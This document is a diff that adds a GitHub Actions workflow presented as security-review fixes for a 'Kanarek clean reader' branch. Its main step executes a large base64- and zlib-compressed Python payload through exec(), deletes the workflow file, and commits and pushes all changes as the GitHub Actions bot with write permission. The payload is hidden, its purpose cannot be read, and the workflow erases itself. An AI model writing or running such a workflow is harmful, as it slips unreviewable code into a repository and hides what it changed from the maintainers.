@@ -1,0 +1,33 @@
+name: Fix Kanarek clean reader security review
+
+on:
+  pull_request:
+    branches: [main]
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: write
+
+jobs:
+  fix:
+    if: github.head_ref == 'feat/kanarek-clean-reader' && github.actor != 'github-actions[bot]'
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v7
+        with:
+          ref: feat/kanarek-clean-reader
+          fetch-depth: 1
+
+      - name: Apply review fixes
+        run: |
+          python -c "import base64,zlib;exec(zlib.decompress(base64.b64decode('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')))"
+          rm .github/workflows/kanarek-clean-reader-final-security-fix.yml
+          git diff --check
+
+      - name: Commit fixes
+        run: |
+          git config user.name "github-actions[bot]"
+          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
+          git add -A
+          git commit -m "fix(kanarek): close clean reader review gaps"
+          git push origin HEAD:feat/kanarek-clean-reader
